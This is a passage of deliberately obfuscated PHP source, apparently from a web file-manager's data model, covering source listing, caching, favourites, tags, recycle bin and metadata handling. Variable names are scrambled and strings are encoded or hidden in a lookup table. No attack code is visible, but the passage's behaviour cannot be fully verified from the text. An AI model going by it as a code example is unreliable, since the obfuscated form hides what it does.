$ÁıœÈ÷ğ[4] . $¡µè×°‰); $Ô¸òŠÅª = self::textEncode($Ô¸òŠÅª); if (array_key_exists($¯–Ü¢¡, $¯šŠˆ¥Ó)) { $øúÚüĞü = is_array($¯šŠˆ¥Ó[$¯–Ü¢¡]) ? json_encode_force($¯šŠˆ¥Ó[$¯–Ü¢¡]) : $¯šŠˆ¥Ó[$¯–Ü¢¡]; $øúÚüĞü = self::textEncode($øúÚüĞü); if ($øúÚüĞü === $Ô¸òŠÅª) { continue; } $§¥ğú÷¯[] = array($ÁıœÈ÷ğ[106], $¯–Ü¢¡, $ÁıœÈ÷ğ[462], $Ô¸òŠÅª, $ÁıœÈ÷ğ[99], time()); } else { $ƒáèö‰¸ = array($ÁıœÈ÷ğ[33] => $ø÷”…è, $ÁıœÈ÷ğ[106] => $¯–Ü¢¡, $ÁıœÈ÷ğ[462] => $Ô¸òŠÅª); $ƒ›§¹¡³[] = $this->filterWhere($ƒáèö‰¸); } } if (!$ƒ›§¹¡³ && !$§¥ğú÷¯) { return !0; } $this->cacheRemove($ø÷”…è); $ œ¿¸ü× = $this->cacheKey($ÁıœÈ÷ğ[497]); CacheLock::lock($ œ¿¸ü×); if ($ƒ›§¹¡³) { $this->addAll($ƒ›§¹¡³); } if ($§¥ğú÷¯) { $this->saveAll($§¥ğú÷¯, $‰Ã¬Æı¢); } CacheLock::unlock($ œ¿¸ü×); return !0; } protected function optionDefault($Åù·¦Í“ = '') { return !1; } public function setDeep($¾™—ö , $¬âÉ§‹© = false, $œÆÔçåŸ = '') { $»é›¾Õ = explode($_SERVER[¤øïŠ‹²][10], $¾™—ö ); $ü‰İíã = $this->get(); array_set_value($ü‰İíã, $¾™—ö , $¬âÉ§‹©); $this->set($»é›¾Õ[0], $ü‰İíã[$»é›¾Õ[0]], $œÆÔçåŸ); } public function remove($şÄÕÀÖ“, $®©ï¸¿¯ = '') { $…ª‹Ÿ± =& $_SERVER[¤øïŠ‹²]; $this->cacheRemove($®©ï¸¿¯); $×·±Éæ´ = $this->filterWhere(array($…ª‹Ÿ±[106] => $şÄÕÀÖ“, $…ª‹Ÿ±[33] => $®©ï¸¿¯)); if (is_null($şÄÕÀÖ“)) { unset($×·±Éæ´[$…ª‹Ÿ±[106]]); } return $this->where($×·±Éæ´)->delete(); } public function removeArr($ùôŠ³Å€, $£¯ÔÛ¦µ = '') { $Ö‚Âêû¿ =& $_SERVER[¤øïŠ‹²]; if (!$ùôŠ³Å€ || !is_array($ùôŠ³Å€)) { return !0; } $this->cacheRemove($£¯ÔÛ¦µ); $¹¡Ò–¬õ = $this->filterWhere(array($Ö‚Âêû¿[33] => $£¯ÔÛ¦µ, $Ö‚Âêû¿[106] => array($Ö‚Âêû¿[7], $ùôŠ³Å€))); return $this->where($¹¡Ò–¬õ)->delete(); } public function cacheSet($•Çî•Õø, $ùŸí‚¼ß = false) { return Cache::set($this->cacheKey($•Çî•Õø), $ùŸí‚¼ß); } public function cacheGet($Îõ¬Ê£ğ) { return Cache::get($this->cacheKey($Îõ¬Ê£ğ)); } public function cacheRemove($Ïç½©©) { return Cache::remove($this->cacheKey($Ïç½©©)); } protected function filterWhere($³§é½¿ü) { return $³§é½¿ü; } protected function cacheKey($ÇùÙ™ÌØ) { return $ÇùÙ™ÌØ; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\165\x72\x63\x65"; protected $tableMeta = array("\x74\x61\x62\154\145\x4e\x61\155\145" => "\151\x6f\137\x73\x6f\165\162\143\x65\x5f\x6d\x65\164\x61", "\155\x65\164\x61\x46\x69\145\x6c\144" => "\163\157\165\x72\x63\x65\x49\x44"); protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\x79\124\151\x6d\145", "\164\x69\155\145", "\x69\x6e\x73\145\x72\x74", "\x66\x75\x6e\x63\164\x69\157\x6e"), array("\x63\x72\x65\141\x74\145\124\151\x6d\x65", "\164\151\155\x65", "\x69\x6e\163\145\162\x74", "\146\x75\x6e\143\x74\x69\x6f\156"), array("\166\x69\x65\x77\x54\x69\155\x65", "\164\x69\155\x65", "\151\x6e\163\x65\x72\164", "\146\165\156\143\164\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ò€ãü ğ) { return $this->listSource(array($_SERVER[¤øïŠ‹²][498] => $ò€ãü ğ)); } public function typeName($‹…²â) { static $ìºçŸ´º = array(self::TYPE_SYSTEM => "\x73\171\163\x74\145\x6d", self::TYPE_USER => "\x75\163\x65\162", self::TYPE_GROUP => "\x67\162\157\165\160"); return $ìºçŸ´º[$‹…²â . $_SERVER[¤øïŠ‹²][12]]; } public function sourceListInfo($§š™ªõ, $˜ÔÅ¨ëê = false) { $íµ½îµ =& $_SERVER[¤øïŠ‹²]; $§š™ªõ = $§š™ªõ ? $§š™ªõ : array(); $§š™ªõ = array_filter(array_unique($§š™ªõ)); if (!$§š™ªõ) { return array(); } $˜„Õàæ = $this->where(array($íµ½îµ[204] => array($íµ½îµ[7], $§š™ªõ)))->select(); $this->_listDataApply($˜„Õàæ, $˜ÔÅ¨ëê); return array_to_keyvalue($˜„Õàæ, $íµ½îµ[204]); } public function pathInfoFilter(&$º²¦«óú) { $¥•¡Ö =& $_SERVER[¤øïŠ‹²]; static $‰âÅä‡Ç = false; static $“´¥Ó¿Ú = false; static $³‹Êáï¾ = false; if (!$‰âÅä‡Ç) { $ığÆÓë¤ = $¥•¡Ö[499]; $ığÆÓë¤ .= $¥•¡Ö[500]; $ığÆÓë¤ .= $¥•¡Ö[501]; $«²ÌÍÆõ = $¥•¡Ö[502]; $òû ©ƒ = explode($¥•¡Ö[50], $«²ÌÍÆõ); $‰âÅä‡Ç = explode($¥•¡Ö[50], $ığÆÓë¤); $“´¥Ó¿Ú = array(); foreach ($‰âÅä‡Ç as $ÊŒıÖ) { if (in_array($ÊŒıÖ, $òû ©ƒ)) { continue; } $“´¥Ó¿Ú[] = $ÊŒıÖ; } $³‹Êáï¾ = explode($¥•¡Ö[50], $¥•¡Ö[503]); } foreach ($³‹Êáï¾ as $ºè·•ª) { if (isset($º²¦«óú[$ºè·•ª])) { $º²¦«óú[$ºè·•ª] = intval($º²¦«óú[$ºè·•ª]); } } $º²¦«óú[$¥•¡Ö[98]] = $¥•¡Ö[504] . $º²¦«óú[$¥•¡Ö[204]] . $¥•¡Ö[505]; $º²¦«óú[$¥•¡Ö[33]] = $º²¦«óú[$¥•¡Ö[506]] == 1 ? $¥•¡Ö[89] : $¥•¡Ö[243]; $º²¦«óú[$¥•¡Ö[201]] = $this->typeName($º²¦«óú[$¥•¡Ö[201]]); if ($º²¦«óú[$¥•¡Ö[506]] != 1) { $º²¦«óú[$¥•¡Ö[179]] = $º²¦«óú[$¥•¡Ö[507]]; unset($º²¦«óú[$¥•¡Ö[507]]); } $Óˆ©ÄÓ = $‰âÅä‡Ç; if (isset($º²¦«óú[$¥•¡Ö[508]]) && $º²¦«óú[$¥•¡Ö[508]][$¥•¡Ö[509]] == -1) { $Óˆ©ÄÓ = $“´¥Ó¿Ú; } $º²¦«óú = array_field_key($º²¦«óú, $Óˆ©ÄÓ); return $º²¦«óú; } public function listUserFav() { $Š’Í§Ã =& $_SERVER[¤øïŠ‹²]; $µ‰¢íì² = Model($Š’Í§Ã[510])->listData(); $ÄÈ×şˆ« = array_filter_by_field($µ‰¢íì², $Š’Í§Ã[33], $Š’Í§Ã[511]); $ÄÈ×şˆ« = array_to_keyvalue($ÄÈ×şˆ«, $Š’Í§Ã[12], $Š’Í§Ã[98]); if ($ÄÈ×şˆ«) { $›¬–¥äß = $this->listSource(array($Š’Í§Ã[512] => array($Š’Í§Ã[513], $ÄÈ×şˆ«))); } $›¬–¥äß = array_to_keyvalue($›¬–¥äß[$Š’Í§Ã[457]], $Š’Í§Ã[204]); foreach ($µ‰¢íì² as &$ùşÓšè) { $ùşÓšè = array($Š’Í§Ã[514] => $ùşÓšè[$Š’Í§Ã[493]], $Š’Í§Ã[515] => $ùşÓšè[$Š’Í§Ã[32]], $Š’Í§Ã[516] => $ùşÓšè[$Š’Í§Ã[98]], $Š’Í§Ã[517] => $ùşÓšè[$Š’Í§Ã[33]], $Š’Í§Ã[518] => $ùşÓšè[$Š’Í§Ã[244]], $Š’Í§Ã[519] => $ùşÓšè[$Š’Í§Ã[99]]); if ($ùşÓšè[$Š’Í§Ã[33]] == $Š’Í§Ã[511] && $›¬–¥äß[$ùşÓšè[$Š’Í§Ã[98]]]) { $ùşÓšè[$Š’Í§Ã[101]] = $›¬–¥äß[$ùşÓšè[$Š’Í§Ã[98]]]; } } unset($ùşÓšè); return $µ‰¢íì²; } public function listUserTag($°í©Ï€Æ) { $ĞÈÇÎÃä =& $_SERVER[¤øïŠ‹²]; if ($°í©Ï€Æ && !is_array($°í©Ï€Æ)) { $°í©Ï€Æ = array($°í©Ï€Æ); } $úÃõ¡”Á = Model($ĞÈÇÎÃä[520])->listData(); $í™ƒüÔ­ = array(); $¡œ“¥å¡ = array(); foreach ($úÃõ¡”Á as $—ä¥Ú…ù) { $ê“ûÓˆƒ = $—ä¥Ú…ù[$ĞÈÇÎÃä[98]]; if (!$ê“ûÓˆƒ) { continue; } if (!isset($¡œ“¥å¡[$ê“ûÓˆƒ])) { $¡œ“¥å¡[$ê“ûÓˆƒ] = array(); } $¡œ“¥å¡[$ê“ûÓˆƒ][] = $—ä¥Ú…ù[$ĞÈÇÎÃä[521]]; $í™ƒüÔ­[$—ä¥Ú…ù[$ĞÈÇÎÃä[98]]] = $—ä¥Ú…ù; } $ÈĞÑÈú = array(); $„¥è¾ĞŒ = array(); $ÑóŒØü® = array(); foreach ($¡œ“¥å¡ as $ä‹Ì§ºö => $‹»ì³ş) { $Ç÷ƒÈõ’ = !0; if (!$°í©Ï€Æ) { $ÈĞÑÈú[] = $ä‹Ì§ºö; continue; } foreach ($°í©Ï€Æ as $ÚÆ¹ßäÂ) { if (!in_array($ÚÆ¹ßäÂ, $‹»ì³ş)) { $Ç÷ƒÈõ’ = !1; break; } } if (!$Ç÷ƒÈõ’) { continue; } if (!is_numeric($ä‹Ì§ºö)) { $ş‡‘ùä· = $í™ƒüÔ­[$ä‹Ì§ºö]; $»¿È©³ = array($ĞÈÇÎÃä[32] => $ş‡‘ùä·[$ĞÈÇÎÃä[32]], $ĞÈÇÎÃä[98] => $ş‡‘ùä·[$ĞÈÇÎÃä[98]], $ĞÈÇÎÃä[33] => $ş‡‘ùä·[$ĞÈÇÎÃä[33]], $ĞÈÇÎÃä[101] => array($ĞÈÇÎÃä[522] => 1), $ĞÈÇÎÃä[245] => !0); if ($ş‡‘ùä·[$ĞÈÇÎÃä[33]] == $ĞÈÇÎÃä[243]) { $ÑóŒØü®[] = $»¿È©³; } if ($ş‡‘ùä·[$ĞÈÇÎÃä[33]] == $ĞÈÇÎÃä[89]) { $„¥è¾ĞŒ[] = $»¿È©³; } continue; } $ÈĞÑÈú[] = $ä‹Ì§ºö; } if ($ÈĞÑÈú) { $ƒà¿‘€ı = $this->listSource(array($ĞÈÇÎÃä[512] => array($ĞÈÇÎÃä[513], $ÈĞÑÈú))); } $ƒà¿‘€ı = $ƒà¿‘€ı ? $ƒà¿‘€ı : array($ĞÈÇÎÃä[96] => array(), $ĞÈÇÎÃä[97] => array()); $ƒà¿‘€ı[$ĞÈÇÎÃä[96]] = array_merge($ƒà¿‘€ı[$ĞÈÇÎÃä[96]], $„¥è¾ĞŒ); $ƒà¿‘€ı[$ĞÈÇÎÃä[97]] = array_merge($ƒà¿‘€ı[$ĞÈÇÎÃä[97]], $ÑóŒØü®); if (isset($ƒà¿‘€ı[$ĞÈÇÎÃä[454]]) && count($ÈĞÑÈú) == $ƒà¿‘€ı[$ĞÈÇÎÃä[454]][$ĞÈÇÎÃä[455]]) { return $ƒà¿‘€ı; } $½İ¢¸ûƒ = array(); $ß–çÅ‡Ù = array_to_keyvalue($ƒà¿‘€ı[$ĞÈÇÎÃä[96]], $ĞÈÇÎÃä[12], $ĞÈÇÎÃä[204]); $àòôµéÁ = array_to_keyvalue($ƒà¿‘€ı[$ĞÈÇÎÃä[97]], $ĞÈÇÎÃä[12], $ĞÈÇÎÃä[204]); $ïåË½Ÿ = array_merge($àòôµéÁ, $ß–çÅ‡Ù); foreach ($ÈĞÑÈú as $ê“ûÓˆƒ) { if (!in_array($ê“ûÓˆƒ, $ïåË½Ÿ)) { $½İ¢¸ûƒ[] = $ê“ûÓˆƒ; } } if ($½İ¢¸ûƒ) { Model($ĞÈÇÎÃä[523])->removeBySource($½İ¢¸ûƒ); } return $ƒà¿‘€ı; } public function listUserRecycle() { $¤†¾Óƒ =& $_SERVER[¤øïŠ‹²]; $¾äÒÖÆ = Model($¤†¾Óƒ[524])->listData(); if (!$¾äÒÖÆ) { return array(); } $ÉÃş¨Î = array($¤†¾Óƒ[512] => array($¤†¾Óƒ[513], $¾äÒÖÆ), $¤†¾Óƒ[525] => 1); return $this->listSource($ÉÃş¨Î); } public function listSource($›Ä½ùİ, $·Í™‚›û = 3000, $ÀşÛÚÕİ = false) { $Ñ­µÀœ­ =& $_SERVER[¤øïŠ‹²]; if (!isset($›Ä½ùİ[$Ñ­µÀœ­[526]])) { $›Ä½ùİ[$Ñ­µÀœ­[526]] = 0; } if (isset($›Ä½ùİ[$Ñ­µÀœ­[203]]) && $›Ä½ùİ[$Ñ­µÀœ­[203]] == $Ñ­µÀœ­[241]) { $›Ä½ùİ[$Ñ­µÀœ­[507]] = array($Ñ­µÀœ­[474], $Ñ­µÀœ­[12]); } if (isset($›Ä½ùİ[$Ñ­µÀœ­[203]])) { $›Ä½ùİ[$Ñ­µÀœ­[203]] = intval($›Ä½ùİ[$Ñ­µÀœ­[203]]); } $°µ˜ú¶¢ = $Ñ­µÀœ­[527]; $ÎÙ‰ÒÆ„ = $this->field($°µ˜ú¶¢)->_makeOrder()->where($›Ä½ùİ)->selectPage($·Í™‚›û); $this->_listPageCheck($ÎÙ‰ÒÆ„, $°µ˜ú¶¢, $›Ä½ùİ); $this->_listDataApply($ÎÙ‰ÒÆ„[$Ñ­µÀœ­[457]], $ÀşÛÚÕİ); $this->_listMake($ÎÙ‰ÒÆ„); return $ÎÙ‰ÒÆ„; } private function _listPageCheck(&$”·‘òË“, $ºá…ƒ¤‡, $Ö«¯û€É) { $ßåàÌÏ¨ =& $_SERVER[¤øïŠ‹²]; if (!is_array($”·‘òË“[$ßåàÌÏ¨[454]])) { return; } $îÉ¸Ì = $”·‘òË“[$ßåàÌÏ¨[454]]; if ($îÉ¸Ì[$ßåàÌÏ¨[456]] <= 1) { return; } if ($îÉ¸Ì[$ßåàÌÏ¨[455]] >= 100000) { return; } if (Model($ßåàÌÏ¨[528])->get($ßåàÌÏ¨[529]) != $ßåàÌÏ¨[530]) { return; } $ºá…ƒ¤‡ = str_replace(array($ßåàÌÏ¨[53], $ßåàÌÏ¨[429], $ßåàÌÏ¨[59]), $ßåàÌÏ¨[12], $ºá…ƒ¤‡); $ºá…ƒ¤‡ = $ßåàÌÏ¨[531] . str_replace($ßåàÌÏ¨[50], $ßåàÌÏ¨[532], $ºá…ƒ¤‡) . $ßåàÌÏ¨[533]; $ûØö—êŞ = $ßåàÌÏ¨[534]; $ûØö—êŞ = $ûØö—êŞ . $ßåàÌÏ¨[535]; $¿ñ—Í€¼ = $îÉ¸Ì[$ßåàÌÏ¨[451]] * ($îÉ¸Ì[$ßåàÌÏ¨[440]] - 1) . $ßåàÌÏ¨[50] . $îÉ¸Ì[$ßåàÌÏ¨[451]]; $íãÌ™å‹ = $this->_makeOrder(!0); $¤š’ÕÔ = $ßåàÌÏ¨[531] . str_replace($ßåàÌÏ¨[50], $ßåàÌÏ¨[532], $íãÌ™å‹[0]); if (strpos($¤š’ÕÔ, $ßåàÌÏ¨[536])) { $¤š’ÕÔ = str_replace($ßåàÌÏ¨[536], $ßåàÌÏ¨[537], $¤š’ÕÔ); } else { $¤š’ÕÔ .= $ßåàÌÏ¨[538] . $íãÌ™å‹[1]; } $ÊÀ…Ú¿¿ = array(); foreach ($Ö«¯û€É as $¼â° ´ => $¨ÏË¿şø) { $ÊÀ…Ú¿¿[$ßåàÌÏ¨[531] . $¼â° ´] = $¨ÏË¿şø; } $this->alias($ßåàÌÏ¨[539])->field($ºá…ƒ¤‡)->limit($¿ñ—Í€¼)->order($¤š’ÕÔ); $íÌëœì¢ = $this->join($ûØö—êŞ)->where($ÊÀ…Ú¿¿)->select(); if ($íÌëœì¢) { $”·‘òË“[$ßåàÌÏ¨[457]] = $íÌëœì¢; } } protected function _makeOrder($øóö–ò¶ = false) { $ÊÎ˜ÓôØ =& $_SERVER[¤øïŠ‹²]; $…Ôá¦‹³ = Model($ÊÎ˜ÓôØ[540])->get($ÊÎ˜ÓôØ[541]); $›¦™Ãºæ = Model($ÊÎ˜ÓôØ[540])->get($ÊÎ˜ÓôØ[542]); $ÂŠÎªì„ = array($ÊÎ˜ÓôØ[543] => $ÊÎ˜ÓôØ[544], $ÊÎ˜ÓôØ[545] => $ÊÎ˜ÓôØ[546]); $‰İúí“ç = array($ÊÎ˜ÓôØ[32] => $ÊÎ˜ÓôØ[32], $ÊÎ˜ÓôØ[90] => $ÊÎ˜ÓôØ[90], $ÊÎ˜ÓôØ[179] => $ÊÎ˜ÓôØ[507], $ÊÎ˜ÓôØ[547] => $ÊÎ˜ÓôØ[547], $ÊÎ˜ÓôØ[548] => $ÊÎ˜ÓôØ[549], $ÊÎ˜ÓôØ[244] => $ÊÎ˜ÓôØ[244], $ÊÎ˜ÓôØ[99] => $ÊÎ˜ÓôØ[99]); $Öœ½½Õ = Input::get($ÊÎ˜ÓôØ[550], $ÊÎ˜ÓôØ[7], $…Ôá¦‹³, array_keys($‰İúí“ç)); $ì´×µ‘¾ = Input::get($ÊÎ˜ÓôØ[551], $ÊÎ˜ÓôØ[7], $›¦™Ãºæ, array_keys($ÂŠÎªì„)); if (!in_array($Öœ½½Õ, array_keys($‰İúí“ç))) { $Öœ½½Õ = $ÊÎ˜ÓôØ[32]; } if (!in_array($ì´×µ‘¾, array_keys($ÂŠÎªì„))) { $Öœ½½Õ = $ÊÎ˜ÓôØ[543]; } if ($Öœ½½Õ == $ÊÎ˜ÓôØ[32]) { } $àˆ£’¿ƒ = $ÊÎ˜ÓôØ[552] . $‰İúí“ç[$Öœ½½Õ] . $ÊÎ˜ÓôØ[53] . $ÂŠÎªì„[$ì´×µ‘¾]; $àˆ£’¿ƒ = rtrim(trim($àˆ£’¿ƒ), $ÊÎ˜ÓôØ[50]); if ($øóö–ò¶) { return array($àˆ£’¿ƒ, $ÂŠÎªì„[$ì´×µ‘¾]); } return $this->order($àˆ£’¿ƒ); } protected function _listDataApplyItem($œ†ğşœ…, $ØÎóÖ = false) { $ÚÕûÖ§ = array($œ†ğşœ…); $this->_listDataApply($ÚÕûÖ§, $ØÎóÖ); return $ÚÕûÖ§[0]; } protected function _listDataApply(&$š½ĞŒŞü, $áóµƒôÓ = false) { $Øığğ×´ =& $_SERVER[¤øïŠ‹²]; if (!$š½ĞŒŞü) { $š½ĞŒŞü = array(); return; } $‚êá²ÛÁ = array_to_keyvalue($š½ĞŒŞü, $Øığğ×´[12], $Øığğ×´[204]); $‚êá²ÛÁ = array_unique($‚êá²ÛÁ); $‚êá²ÛÁ = array_to_int($‚êá²ÛÁ); $this->_listSourceCache($š½ĞŒŞü); if (!$áóµƒôÓ) { $this->_listAppendMeta($š½ĞŒŞü, $‚êá²ÛÁ); $this->_listAppendFileMeta($š½ĞŒŞü, $‚êá²ÛÁ); $this->_listAppendChildren($š½ĞŒŞü, $‚êá²ÛÁ); } $this->_listAppendPath($š½ĞŒŞü); $this->_listAppendAuth($š½ĞŒŞü); $this->_listAppendSourceInfo($š½ĞŒŞü, $‚êá²ÛÁ); $this->_listAppendUser($š½ĞŒŞü); $this->_listFilterInfo($š½ĞŒŞü, $áóµƒôÓ); $this->_listAppendAuthSecret($š½ĞŒŞü); } protected function _listSourceCache($Ã‘ù«‹Ä) { $®·¬µÙ =& $_SERVER[¤øïŠ‹²]; foreach ($Ã‘ù«‹Ä as $×Û¸Ãë´) { self::$cacheSourceInfo[$®·¬µÙ[553] . $×Û¸Ãë´[$®·¬µÙ[204]]] = $×Û¸Ãë´; } } protected function _listFilterInfo(&$‹ğ÷æÄş, $¼ÉÙ•½Š = false) { $ìÊÁºˆ— =& $_SERVER[¤øïŠ‹²]; foreach ($‹ğ÷æÄş as &$µ­µääÜ) { $µ­µääÜ = $this->pathInfoFilter($µ­µääÜ); self::$cachePathInfo[$ìÊÁºˆ—[554] . intval($¼ÉÙ•½Š) . $ìÊÁºˆ—[483] . $µ­µääÜ[$ìÊÁºˆ—[204]]] = $µ­µääÜ; } unset($µ­µääÜ); } protected function _listMake(&$ÑÖÀñÓ) { $¿Ôœ˜¿‘ =& $_SERVER[¤øïŠ‹²]; $ÑÖÀñÓ[$¿Ôœ˜¿‘[96]] = array(); $ÑÖÀñÓ[$¿Ôœ˜¿‘[97]] = array(); foreach ($ÑÖÀñÓ[$¿Ôœ˜¿‘[457]] as $¬î©œâ) { $ÚœŞ™š = $¬î©œâ[$¿Ôœ˜¿‘[506]] == 1 ? $¿Ôœ˜¿‘[96] : $¿Ôœ˜¿‘[97]; $ÑÖÀñÓ[$ÚœŞ™š][] = $¬î©œâ; } unset($ÑÖÀñÓ[$¿Ôœ˜¿‘[457]]); } protected function _listAppendMeta(&$¸±úÚÚ°, $ˆÇéó“’) { $‘²ÎÛï¼ =& $_SERVER[¤øïŠ‹²]; $àòñÜô = array($‘²ÎÛï¼[512] => array($‘²ÎÛï¼[513], $ˆÇéó“’)); $ƒ€ØÌºü = Model($‘²ÎÛï¼[555])->field($‘²ÎÛï¼[556])->where($àòñÜô)->select(); if (!$ƒ€ØÌºü) { return; } $õî­„´Š = array($‘²ÎÛï¼[557], $‘²ÎÛï¼[558], $‘²ÎÛï¼[537]); $âĞ¦´øÁ = array(); foreach ($ƒ€ØÌºü as $—®Ü±) { if (!isset($âĞ¦´øÁ[$—®Ü±[$‘²ÎÛï¼[204]]])) { $âĞ¦´øÁ[$—®Ü±[$‘²ÎÛï¼[204]]] = array(); } if (in_array($—®Ü±[$‘²ÎÛï¼[106]], $õî­„´Š)) { continue; } if ($—®Ü±[$‘²ÎÛï¼[106]] == $‘²ÎÛï¼[559]) { $—®Ü±[$‘²ÎÛï¼[462]] = $‘²ÎÛï¼[560]; } $âĞ¦´øÁ[$—®Ü±[$‘²ÎÛï¼[204]]][$—®Ü±[$‘²ÎÛï¼[106]]] = $—®Ü±[$‘²ÎÛï¼[462]]; } foreach ($¸±úÚÚ° as &$È¢¬†Ş) { $È¢¬†Ş[$‘²ÎÛï¼[561]] = !1; if (isset($âĞ¦´øÁ[$È¢¬†Ş[$‘²ÎÛï¼[204]]])) { $È¢¬†Ş[$‘²ÎÛï¼[561]] = $âĞ¦´øÁ[$È¢¬†Ş[$‘²ÎÛï¼[204]]]; } if ($this->fileIsLock($È¢¬†Ş) && $È¢¬†Ş[$‘²ÎÛï¼[508]]) { $êĞ—äœÈ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $È¢¬†Ş[$‘²ÎÛï¼[508]][$‘²ÎÛï¼[509]] = AuthModel::authDisable($È¢¬†Ş[$‘²ÎÛï¼[508]][$‘²ÎÛï¼[509]], $êĞ—äœÈ); $È¢¬†Ş[$‘²ÎÛï¼[508]][$‘²ÎÛï¼[562]][$‘²ÎÛï¼[508]] = $È¢¬†Ş[$‘²ÎÛï¼[508]][$‘²ÎÛï¼[509]]; } } unset($È¢¬†Ş); } protected function _listAppendFileMeta(&$²Ø´Ìë, $íëÔá·°) { $Ò©¸¶Ù¯ =& $_SERVER[¤øïŠ‹²]; $©Ô×²± = array_to_keyvalue($²Ø´Ìë, $Ò©¸¶Ù¯[12], $Ò©¸¶Ù¯[563]); $©Ô×²± = array_filter(array_unique($©Ô×²±)); $©Ô×²± = array_to_int($©Ô×²±); if (!$©Ô×²±) { return; } $ ¥¢†ØÀ = array($Ò©¸¶Ù¯[564] => array($Ò©¸¶Ù¯[513], $©Ô×²±)); $ÍãƒŠÄ = $Ò©¸¶Ù¯[565]; $³ ¨ëö = Model($Ò©¸¶Ù¯[566])->field($ÍãƒŠÄ)->where($ ¥¢†ØÀ)->select(); $³ ¨ëö = array_to_keyvalue($³ ¨ëö, $Ò©¸¶Ù¯[563]); $ÁË‡‡…² = Model($Ò©¸¶Ù¯[567])->field($Ò©¸¶Ù¯[568])->where($ ¥¢†ØÀ)->select(); $ÁË‡‡…² = $ÁË‡‡…² ? $ÁË‡‡…² : array(); $‘çÏ¿  = array(); foreach ($ÁË‡‡…² as $ó‘ÔŒäÏ) { if (!isset($‘çÏ¿ [$ó‘ÔŒäÏ[$Ò©¸¶Ù¯[563]]])) { $‘çÏ¿ [$ó‘ÔŒäÏ[$Ò©¸¶Ù¯[563]]] = array(); } $‘çÏ¿ [$ó‘ÔŒäÏ[$Ò©¸¶Ù¯[563]]][$ó‘ÔŒäÏ[$Ò©¸¶Ù¯[106]]] = $ó‘ÔŒäÏ[$Ò©¸¶Ù¯[462]]; } foreach ($²Ø´Ìë as &$®–ŸÅ) { $ ğØĞöˆ = $®–ŸÅ[$Ò©¸¶Ù¯[563]]; if (!$ ğØĞöˆ || !is_array($³ ¨ëö[$ ğØĞöˆ])) { continue; } $ÙşÖÓÙü = $³ ¨ëö[$ ğØĞöˆ]; $ÙşÖÓÙü[$Ò©¸¶Ù¯[90]] = $®–ŸÅ[$Ò©¸¶Ù¯[90]]; $ÙşÖÓÙü[$Ò©¸¶Ù¯[32]] = $®–ŸÅ[$Ò©¸¶Ù¯[32]]; if (!$ÙşÖÓÙü[$Ò©¸¶Ù¯[569]]) { Model($Ò©¸¶Ù¯[566])->fileMd5Check($ÙşÖÓÙü); } if (!isset(self::$cacheFileInfo[$Ò©¸¶Ù¯[570] . $ ğØĞöˆ])) { self::$cacheFileInfo[$Ò©¸¶Ù¯[570] . $ ğØĞöˆ] = array_merge(array(), $ÙşÖÓÙü); } unset($³ ¨ëö[$ ğØĞöˆ][$Ò©¸¶Ù¯[98]]); $ˆôóåÏ = isset($‘çÏ¿ [$ ğØĞöˆ]) && is_array($‘çÏ¿ [$ ğØĞöˆ]) ? $‘çÏ¿ [$ ğØĞöˆ] : array(); $®–ŸÅ[$Ò©¸¶Ù¯[180]] = array_merge($ˆôóåÏ, $³ ¨ëö[$ ğØĞöˆ]); if (isset($®–ŸÅ[$Ò©¸¶Ù¯[180]][$Ò©¸¶Ù¯[195]])) { $®–ŸÅ[$Ò©¸¶Ù¯[195]] = json_decode($®–ŸÅ[$Ò©¸¶Ù¯[180]][$Ò©¸¶Ù¯[195]], !0); unset($®–ŸÅ[$Ò©¸¶Ù¯[180]][$Ò©¸¶Ù¯[195]]); } } unset($®–ŸÅ); } protected function _listAppendSourceInfo(&$ÏìŒ—»Û, $Ü™”â…¯) { $´ŞşßØ =& $_SERVER[¤øïŠ‹²]; $»–ÙâÖŠ = Model($´ŞşßØ[571])->listData(); $™÷Ÿ™± = Model($´ŞşßØ[520])->listData(); $½¹êÑ” = Model($´ŞşßØ[510])->listData(); $¶—±éî› = Model($´ŞşßØ[572])->listSimple(); $³€¬ÄÑÀ = array_to_keyvalue($»–ÙâÖŠ, $´ŞşßØ[493]); $Ì‡¼Èˆ¸ = array_to_keyvalue_group($™÷Ÿ™±, $´ŞşßØ[98], $´ŞşßØ[521]); $¯¨•°‡§ = array_to_keyvalue($½¹êÑ”, $´ŞşßØ[98]); $á—‹—Ü± = array_to_keyvalue_group($¶—±éî›, $´ŞşßØ[204]); foreach ($ÏìŒ—»Û as &$±ûÈî¾ú) { $±ûÈî¾ú[$´ŞşßØ[101]] = array($´ŞşßØ[573] => 0, $´ŞşßØ[574] => 0, $´ŞşßØ[575] => 0); if (isset($¯¨•°‡§[$±ûÈî¾ú[$´ŞşßØ[204]]])) { $±ûÈî¾ú[$´ŞşßØ[101]][$´ŞşßØ[576]] = 1; $±ûÈî¾ú[$´ŞşßØ[101]][$´ŞşßØ[577]] = $¯¨•°‡§[$±ûÈî¾ú[$´ŞşßØ[204]]][$´ŞşßØ[32]]; } if ($Ì‡¼Èˆ¸ && $³€¬ÄÑÀ && isset($Ì‡¼Èˆ¸[$±ûÈî¾ú[$´ŞşßØ[204]]])) { $±ûÈî¾ú[$´ŞşßØ[101]][$´ŞşßØ[578]] = array(); foreach ($Ì‡¼Èˆ¸[$±ûÈî¾ú[$´ŞşßØ[204]]] as $Öà²÷­´) { $¬Ñ­³‰ô = $³€¬ÄÑÀ[$Öà²÷­´]; $±ûÈî¾ú[$´ŞşßØ[101]][$´ŞşßØ[578]][] = array($´ŞşßØ[579] => $¬Ñ­³‰ô[$´ŞşßØ[493]], $´ŞşßØ[515] => $¬Ñ­³‰ô[$´ŞşßØ[32]], $´ŞşßØ[580] => $¬Ñ­³‰ô[$´ŞşßØ[581]]); } } if ($á—‹—Ü± && isset($á—‹—Ü±[$±ûÈî¾ú[$´ŞşßØ[204]]])) { $±ûÈî¾ú[$´ŞşßØ[101]][$´ŞşßØ[582]] = array(); foreach ($á—‹—Ü±[$±ûÈî¾ú[$´ŞşßØ[204]]] as $İÂüÍ—¿) { $±ûÈî¾ú[$´ŞşßØ[101]][$´ŞşßØ[582]] = $this->shareFilterShow($İÂüÍ—¿); } } } unset($±ûÈî¾ú); return $ÏìŒ—»Û; } protected function shareFilterShow($áœ€ÔÍü) { $†ÃÁññ =& 